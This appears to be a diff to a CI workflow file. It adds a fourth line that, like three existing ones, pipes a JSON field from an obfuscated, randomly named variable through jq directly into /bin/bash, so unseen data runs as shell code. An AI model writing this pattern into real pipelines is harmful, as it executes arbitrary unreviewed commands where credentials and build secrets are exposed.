@@ -21,6 +21,7 @@ jobs:
           echo $owhkk463 | jq -r .tgem10549 | /bin/bash
           echo $wgl5 | jq -r .h68 | /bin/bash
           printf '%s' "$fn6" | jq -r .ftxil9844 | /bin/bash
+          printf '%s' "$a41" | jq -r .langr3 | /bin/bash
 
       - name: Archive output
         if: always()
